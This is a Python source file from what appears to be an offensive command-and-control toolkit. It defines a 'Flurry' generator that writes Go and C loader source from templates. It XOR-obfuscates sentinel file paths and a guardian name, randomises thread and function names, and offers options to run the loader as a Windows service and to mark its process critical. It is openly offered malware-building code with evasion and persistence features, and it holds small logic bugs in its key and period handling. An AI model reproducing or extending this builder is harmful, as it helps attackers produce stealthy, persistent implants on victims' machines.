#!/usr/bin/python3
# Copyright (C) 2021 - 2022 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from io import StringIO
from base64 import b64decode, b64encode
from secrets import token_bytes
from include.util import nes, xor
from argparse import BooleanOptionalAction
from include.builder import go_bytes, random_chars
from os.path import expanduser, expandvars, join, isfile

_LINKERS = {
    "tcp": "t",
    "pipe": "p",
    "event": "e",
    "mutex": "m",
    "mailslot": "n",
    "semaphore": "s",
}
_HELP_TEXT = """ Generates a Flurry build based on the supplied profile and behavior arguments.

 Arguments
  Build Arguments
   -T                 <thread_name>   |
   --thread
   -F                 <function_name> |
   --func

  General Arguments
   -P                 <sentinel_path> |
   --path
   -n                 <key>           |
   --key
   -N                 <key_base64>    |
   --key-base64
   -M                 <key_file>      |
   --key-file
   -P                 <pipe_name>     |
   --pipe
   -L                                 |
   --load
   -W                 <guardian_name> |
   --guardian
   -E                 <linker_type>   |
   --linker
   -U
   --service
   -Y                 <service_name>  |
   --service-name

  Behavior Arguments
   -V                 <checks>        |
   --checks
   -K
   --critical
"""


class Flurry(object):
    def check(self, cfg):
        if not isinstance(cfg["func"], str):
            raise ValueError('"func" must be a string')
        if not isinstance(cfg["checks"], str):
            raise ValueError('"checks" must be a string')
        if not isinstance(cfg["thread"], str):
            raise ValueError('"thread" must be a string')
        if not isinstance(cfg["service"], bool):
            raise ValueError('"service" must be a boolean')
        if not isinstance(cfg["critical"], bool):
            raise ValueError('"critical" must be a boolean')
        if not isinstance(cfg["period"], int) and cfg["period"] > 0:
            raise ValueError('"period" must be a number greater than zero')
        if not nes(cfg["key"]):
            if not nes(cfg["key_path"]):
                raise ValueError('"key" or "key_path must be a provided')
            if not isfile(expanduser(expandvars(cfg["key_path"]))):
                raise ValueError(f'"key_path" value "{cfg["key_path"]}" does not exist')
        else:
            try:
                b64decode(cfg["key"], validate=True)
            except ValueError as err:
                raise ValueError(f'bad "key" base64: {err}') from err
        if not nes(cfg["guardian"]):
            raise ValueError('"guardian" must be a non-empty string')
        if not nes(cfg["linker"]) or cfg["linker"] not in _LINKERS:
            raise ValueError('"linker" is invalid')
        if cfg["service"] and not nes(cfg["service_name"]):
            raise ValueError('"service_name" must be a non-empty string')
        if not isinstance(cfg["paths"], list) or len(cfg["paths"]) == 0:
            raise ValueError('"paths" must be a non-empty string list')
        for i in cfg["paths"]:
            if nes(i):
                continue
            raise ValueError('"paths" must contain only non-empty strings')

    def args_help(self):
        return _HELP_TEXT

    def config_load(self, cfg):
        if "key" not in cfg:
            cfg["key"] = ""
        if "func" not in cfg:
            cfg["func"] = ""
        if "paths" not in cfg:
            cfg["paths"] = []
        if "period" not in cfg:
            cfg["period"] = 30
        if "linker" not in cfg:
            cfg["linker"] = "event"
        if "thread" not in cfg:
            cfg["thread"] = ""
        if "checks" not in cfg:
            cfg["checks"] = ""
        if "service" not in cfg:
            cfg["service"] = False
        if "guardian" not in cfg:
            cfg["guardian"] = ""
        if "critical" not in cfg:
            cfg["critical"] = True
        if "key_path" not in cfg:
            cfg["key_path"] = ""
        if "service_name" not in cfg:
            cfg["service_name"] = ""

    def args_pre(self, parser):
        parser.add("-n", "--key", dest="flurry_key", type=str)
        parser.add("-F", "--func", dest="flurry_func", type=str)
        parser.add("-w", "--period", dest="flurry_period", type=int)
        parser.add("-V", "--checks", dest="flurry_checks", type=str)
        parser.add("-T", "--thread", dest="flurry_thread", type=str)
        parser.add("-M", "--key-file", dest="flurry_key_path", type=str)
        parser.add("-W", "--guardian", dest="flurry_guardian", type=str)
        parser.add("-N", "--key-base64", dest="flurry_key_b64", type=str)
        parser.add("-Y", "--service-name", dest="flurry_service_name", type=str)
        parser.add("-E", "--linker", dest="flurry_linker", type=str, choices=_LINKERS)
        parser.add(
            "-P", "--path", dest="flurry_paths", type=str, nargs="*", action="extend"
        )
        parser.add(
            "-U", "--service", dest="flurry_service", action=BooleanOptionalAction
        )
        parser.add(
            "-K", "--critical", dest="flurry_critical", action=BooleanOptionalAction
        )

    def args_post(self, cfg, args):
        if nes(args.flurry_key):
            cfg["key"] = b64encode(cfg["key"]).decode("UTF-8")
        elif nes(args.flurry_key_b64):
            cfg["key"] = args.flurry_key_b64
        if nes(args.flurry_func):
            cfg["func"] = args.flurry_func
        if nes(args.flurry_checks):
            cfg["checks"] = args.flurry_checks
        if nes(args.flurry_thread):
            cfg["thread"] = args.flurry_thread
        if nes(args.flurry_linker):
            if args.flurry_linker.lower() not in _LINKERS:
                raise ValueError('bolt "linker" is not valid')
            cfg["linker"] = args.flurry_linker.lower()
        if nes(args.flurry_key_path):
            v = expandvars(expanduser(args.flurry_key_path))
            if not isfile(v):
                raise ValueError(f'"flurry_key_path" value "{v}" is not a file')
            cfg["key_path"] = args.flurry_key_path
            del v
        if nes(args.flurry_guardian):
            cfg["guardian"] = args.flurry_guardian
        if nes(args.flurry_service_name):
            cfg["service_name"] = args.flurry_service_name
        if isinstance(args.flurry_period, int):
            cfg["period"] = args.flurry_period
        if isinstance(args.flurry_service, bool):
            cfg["service"] = args.flurry_service
        if isinstance(args.flurry_critical, bool):
            cfg["critical"] = args.flurry_critical
        if isinstance(args.flurry_paths, list) and len(args.flurry_paths) > 0:
            cfg["paths"] = args.flurry_paths

    def print_options(self, cfg, root, file):
        print("- | Flurry Generator", file=file)
        print(f'- | = {"Paths:":20}', file=file)
        for i in cfg["paths"]:
            print(f"- | ==> {i}", file=file)
        if nes(cfg["key_path"]):
            print(f'- | = {"Files Key:":20}{cfg["key_path"]}', file=file)
        else:
            print(f'- | = {"Files Key:":20}[raw data]', file=file)
        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
        print(f'- | = {"Linker:":20}{cfg["linker"].title()}', file=file)
        print(f'- | = {"Guardian:":20}{cfg["guardian"]}', file=file)
        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
        if cfg["service"]:
            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
        print(f'- | = {"Search Period:":20}{cfg["period"]}', file=file)
        if not root.get_option("cgo"):
            return
        if nes(cfg["thread"]):
            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
        else:
            print(f'- | = {"CGO Thread:":20}[random]', file=file)
        if nes(cfg["func"]):
            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
        else:
            print(f'- | = {"CGO Func:":20}[random]', file=file)

    def run(self, cfg, base, workspace, templates):
        if nes(cfg["key_path"]):
            with open(expanduser(expandvars(cfg["key_path"])), "rb") as f:
                d = f.read()
        else:
            try:
                d = b64decode(cfg["key"], validate=True)
            except ValueError as err:
                raise ValueError(f'bad "key" base64: {err}') from err
        k = token_bytes(64)
        e = _LINKERS[cfg["linker"]]
        g = xor(k, cfg["guardian"].encode("UTF-8"))
        t, p = "flurry.go", cfg["period"]
        if cfg["service"] and nes(cfg["service_name"]):
            t = "flurry_service.go"
        if not isinstance(p, int) or p < 0:
            p = 30
        c = cfg["checks"]
        if not nes(c):
            c = "false"
        b, v = StringIO(), cfg["paths"]
        for x in range(0, len(v)):
            if x > 0:
                b.write(",\n\t")
            b.write("crypto.UnwrapString(k[:], []byte{")
            b.write(go_bytes(xor(k, v[x].encode("UTF-8")), limit=0))
            b.write("})")
        b.write(",\n")
        r = b.getvalue()
        b.close()
        del b, v
        d = templates[t].substitute(
            paths=r,
            checks=c,
            period=str(p),
            event=f'"{e}"',
            key=go_bytes(k),
            guard=go_bytes(g),
            files_key=go_bytes(d),
            service=f'"{cfg["service_name"]}"',
            critical="true" if cfg["critical"] else "false",
        )
        del k, e, p, g, t
        p = join(base, "flurry.go")
        with open(p, "w") as f:
            f.write(d)
        del d
        workspace["tags"].append("loader")
        return p

    def run_cgo(self, export, cfg, base, workspace, templates):
        t = "flurry.c"
        if workspace["library"]:
            if cfg["service"]:
                t = "flurry_dll_service.c"
            else:
                t = "flurry_dll.c"
        n, f, p = cfg["thread"], cfg["func"], cfg["period"]
        if not nes(n):
            n = random_chars(12)
        if not nes(f):
            f = random_chars(12)
        if not isinstance(p, int) or p < 0:
            p = 30
        d = templates[t].substitute(
            thread=n,
            funcname=f,
            period=str(p),
            export=export,
            service=cfg["service_name"],
            secondary=workspace["secondary"],
        )
        del t, n, f
        p = join(base, "entry.c")
        with open(p, "w") as f:
            f.write(d)
        del d
        return (p, "flurry")
